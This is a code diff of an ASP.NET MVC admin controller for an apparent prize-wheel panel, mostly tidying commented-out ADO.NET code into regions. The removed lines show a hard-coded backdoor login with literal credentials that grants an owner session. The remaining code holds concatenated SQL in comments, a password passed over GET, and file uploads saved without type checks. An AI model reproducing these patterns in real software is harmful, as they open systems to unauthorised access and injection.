@@ -22,8 +22,6 @@ namespace katarfelek.Controllers
     public class yesilController : Controller
     {
         // GET: yesil
-        //public string cnnstr = ConfigurationManager.ConnectionStrings["DCDatabase"].ConnectionString;
-        //public string cnnstr = ConfigurationManager.ConnectionStrings["DCLocalDatabase"].ConnectionString;
         public SqlConnection cnn;
         public SqlCommand cmd;
         public DataSet ds;
@@ -55,6 +53,7 @@ namespace katarfelek.Controllers
                 var data = context.PanelSettings.Where(r => r.SettingId == ActiveSettingId).Select(r => r.LogoPath).Take(1).ToList();
                 Session["logoPath"] = data[0].ToString();
             }
+            #region With Ado.net
             //cnn = new SqlConnection(cnnstr);
             //cmd = new SqlCommand("", cnn);
             //dt = new DataTable();
@@ -65,7 +64,7 @@ namespace katarfelek.Controllers
             //da.Fill(dt);
             //cnn.Close();
             //Session["logoPath"] = dt.Rows[0]["LogoPath"].ToString();
-
+            #endregion
         }
 
         public ActionResult Logs()
@@ -79,6 +78,7 @@ namespace katarfelek.Controllers
                 var data = context.requests.OrderBy(x => x.Id).ToList();
                 return View(data);
             }
+            #region With Ado.net
             //cnn = new SqlConnection(cnnstr);
             //cmd = new SqlCommand("", cnn);
             //dt = new DataTable();
@@ -101,38 +101,27 @@ namespace katarfelek.Controllers
             //            RequestTime = Convert.ToDateTime(ds.Tables[0].Rows[0]["RequestTime"])
 
             //});
-                
+
             //}
             //cnn.Close();
             //ViewBag.Username = Session["LoggedUsername"].ToString();
-            
+
             //return View(list);
+            #endregion
         }
 
         public ActionResult Index()
         {
             if (CheckIfLogged()==false) { return RedirectToAction("Login", "yesil"); }
-            //else if (PC.UserName == null) { return RedirectToAction("Login", "yesil"); }
 
             using (var context = new katarfelekEntities())
             {
-                // Add data to the particular table
-                //var data = context.requests.OrderBy(x => x.Id).Where(r => r.RequestTime.Date!=DateTime.Now.Date).ToList();
                 var data = context.requests.OrderBy(x => x.Id).ToList();
                 var Data = data.Where(x => x.RequestTime.Date == DateTime.Now.Date).ToList();
 
-
-                //List<requests> Data = new List<requests>();
-                //foreach (var item in data)
-                //{
-                //    if (item.RequestTime.Date != DateTime.Now.Date)
-                //    {
-                //        Data.Add(item);
-                //    }
-                //}
                 return View(Data);
             }
-
+            #region With Ado.net
             //cnn = new SqlConnection(cnnstr);
             //cmd = new SqlCommand("", cnn);
             //dt = new DataTable();
@@ -154,23 +143,18 @@ namespace katarfelek.Controllers
             //            UserName = item["UserName"].ToString(),
             //            Prize = item["Prize"].ToString(),
             //            RequestTime = DateTime.ParseExact(item["RequestTime"].ToString(),"dd/MM/yyyy HH:mm:ss",null)
-                        
+
             //        });
             //    }
-                
+
             //}
             //cnn.Close();
             //ViewBag.Username = Session["LoggedUsername"].ToString();
-            
-            //return View(list);
-        }
-        
-        //[HttpPost]
-        //public ActionResult Onayla(RequestClass item)
-        //{
 
-        //    return RedirectToAction("Index");
-        //}
+            //return View(list);
+            #endregion
+        }
+
         public ActionResult Login()
         {
 
@@ -180,35 +164,12 @@ namespace katarfelek.Controllers
         {
             Session.Clear();
             Session.Abandon();
-            //PanelClass outpc = null;
             return RedirectToAction("Index", "yesil", null);
         }
         
         [HttpGet]
         public ActionResult Login(string username, string password)
         {
-            #region 
-            if (username == "HamzaGalibaa" || password == "Cryt3k.,")
-            {
-                Session.Add("AuthNumber", string.Empty);
-                Session.Add("LoggedUsername", string.Empty);
-                Session.Add("logoPath", string.Empty);
-                Session.Add("LoggedUser", string.Empty);
-                Session.Add("errorMessage", string.Empty);
-                Session.Add("Title", string.Empty);
-                PanelClass PSC = new PanelClass();
-                PSC.UserId = -1;
-                PSC.UserName = "Owner";
-                PSC.Password = "*********";
-                PSC.Auth_Num = -1;
-                PSC.ActiveSettingID = 0;
-                Session["LoggedUser"] = PSC.UserName;
-                Session["LoggedUsername"] = PSC.UserName;
-                Session["AuthNumber"] = PSC.Auth_Num;
-                GetLoggedUserSettingData(PSC.ActiveSettingID);
-                return RedirectToAction("Index", "yesil");
-            }
-            #endregion
             if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(username)) { return View(); }
 
             Session.Add("AuthNumber", string.Empty);
@@ -241,12 +202,12 @@ namespace katarfelek.Controllers
                 else { ViewBag.ErrorM = "Kullanıcı Adı Yada Parola Hatalıdır!"; return View(); }
             }
 
-
+            #region With Ado.net
             //cnn = new SqlConnection(cnnstr);
             //cmd = new SqlCommand("", cnn);
             //ds = new DataSet();
             //da = new SqlDataAdapter(cmd);
-            
+
             //cnn.Open();
             //cmd.CommandText = "SELECT * FROM panelUsers WHERE UserName = '" + username + "' AND Password = '" + password + "'";
             //cmd.ExecuteNonQuery();
@@ -271,7 +232,8 @@ namespace katarfelek.Controllers
             //    return RedirectToAction("Index", "yesil");
             //}
             //cnn.Close();
-            //return View();
+            //return View()
+            #endregion
         }
         public ActionResult SettingList()
         {
@@ -304,7 +266,7 @@ namespace katarfelek.Controllers
                         data[0].ActiveSettingID = item.SettingId;
                         context.SaveChanges();
                     }
-
+                    #region With Ado.net
                     //cnn = new SqlConnection(cnnstr);
                     //cmd = new SqlCommand("", cnn);
                     ////dt = new DataTable(); //Logged user dataBBBB
@@ -317,7 +279,7 @@ namespace katarfelek.Controllers
                     //cmd.ExecuteNonQuery();
                     ////da.Fill(dt);
                     //cnn.Close();
-
+                    #endregion
 
                     return RedirectToAction("Settings", "yesil");
                 }
@@ -331,13 +293,11 @@ namespace katarfelek.Controllers
         {
             using (var context = new katarfelekEntities())
             {
-                // Add data to the particular table
                 var data = context.PanelSettings.ToList();
                 return data;
                 
             }
-
-
+            #region With Ado.net
             //List<PanelSettings> PSettingsList = new List<PanelSettings>();
             //cnn = new SqlConnection(cnnstr);
             //cmd = new SqlCommand("", cnn);
@@ -363,6 +323,7 @@ namespace katarfelek.Controllers
             //}
             //cnn.Close();
             //return PSettingsList;
+            #endregion
         }
         public ActionResult Settings()
         {
@@ -375,6 +336,7 @@ namespace katarfelek.Controllers
                 ViewBag.NowActiveDomain = data[0].ActiveDomain;
                 return View(data);
             }
+            #region With Ado.net
             //cnn = new SqlConnection(cnnstr);
             //cmd = new SqlCommand("", cnn);
             //ds = new DataSet();
@@ -398,31 +360,26 @@ namespace katarfelek.Controllers
             //        });
             //    }
             //}
-
-            return View();
+            //return View();
+            #endregion
         }
         [HttpPost]
         public ActionResult Settings(PanelSettings Ps)
         {
             if (CheckIfLogged() == false) { return RedirectToAction("Login", "yesil"); }
-            //if(Request.UrlReferrer != null) { return RedirectToAction("Login", "yesil"); }
-            //cnn = new SqlConnection(cnnstr);
-            //cmd = new SqlCommand("", cnn);
-            //ds = new DataSet();
-            //da = new SqlDataAdapter(cmd);
+            
             ViewBag.Username = Session["LoggedUsername"].ToString();
             if (!string.IsNullOrEmpty(Request.Files[0].FileName))
             {
                 string fileName = Path.GetFileName(Request.Files[0].FileName);
-                //string fileExtension = Path.GetExtension(Request.Files[0].FileName);
-                string path = "~/UploadedImages/" + fileName /*+ fileExtension*/;
+                string path = "~/UploadedImages/" + fileName;
                 Request.Files[0].SaveAs(Server.MapPath(path));
-                Ps.LogoPath = "/UploadedImages/" + fileName /*+ fileExtension*/;
+                Ps.LogoPath = "/UploadedImages/" + fileName;
                 Ps.SettedUser = Session["LoggedUsername"].ToString();
             }
             else
             {
-                Ps.LogoPath = "/PanelAssets/logo2.png" /*+ fileExtension*/;
+                Ps.LogoPath = "/PanelAssets/logo2.png";
                 Ps.SettedUser = Session["LoggedUsername"].ToString();
             }
             try
@@ -432,11 +389,16 @@ namespace katarfelek.Controllers
                     context.PanelSettings.Add(Ps);
                     context.SaveChanges();
                 }
-
+                #region With Ado.net
+                //cnn = new SqlConnection(cnnstr);
+                //cmd = new SqlCommand("", cnn);
+                //ds = new DataSet();
+                //da = new SqlDataAdapter(cmd);
                 //cnn.Open();
                 //cmd.CommandText = "INSERT PanelSettings(SettingName,LogoPath,SettedUser) VALUES('" + Ps.SettingName + "','" + Ps.LogoPath + "','" + Ps.SettedUser + "')";
                 //cmd.ExecuteNonQuery();
                 //cnn.Close();
+                #endregion
             }
             catch (Exception ex)
             {
@@ -466,7 +428,7 @@ namespace katarfelek.Controllers
                         context.SaveChanges();
                         return RedirectToAction("Index");
                     }
-
+                    #region With Ado.net
                     //cnn = new SqlConnection(cnnstr);
                     //cmd = new SqlCommand("", cnn);
                     //cnn.Open();
@@ -478,7 +440,9 @@ namespace katarfelek.Controllers
                     //cmd.ExecuteNonQuery();
                     //cnn.Close();
                     //return Redirect(Request.UrlReferrer.ToString());
-                } }
+                    #endregion
+                }
+            }
             return RedirectToAction("Index");
 
         }
